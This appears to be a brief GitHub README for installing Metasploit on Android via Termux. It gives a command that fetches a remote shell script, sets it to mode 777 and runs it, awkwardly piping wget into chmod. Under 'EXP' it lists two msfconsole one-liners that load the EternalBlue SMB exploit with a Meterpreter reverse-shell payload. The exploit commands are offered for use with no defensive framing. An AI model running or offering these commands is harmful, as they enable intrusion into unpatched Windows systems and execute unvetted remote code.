# msfconsole-termux

### How To Install Metasploit-Table on the Android Termux

```
pkg  update

apt-get install curl wget -y

wget https://raw.githubusercontent.com/jas502n/msfconsole-termux/master/metasploit.sh |chmod 777 metasploit.sh && ./metasploit.sh


```

EXP

```
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/meterpreter/reverse_tcp;set ProcessName explorer.exe;show options"


msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/meterpreter/reverse_tcp;set ProcessName explorer.exe;show options"

```
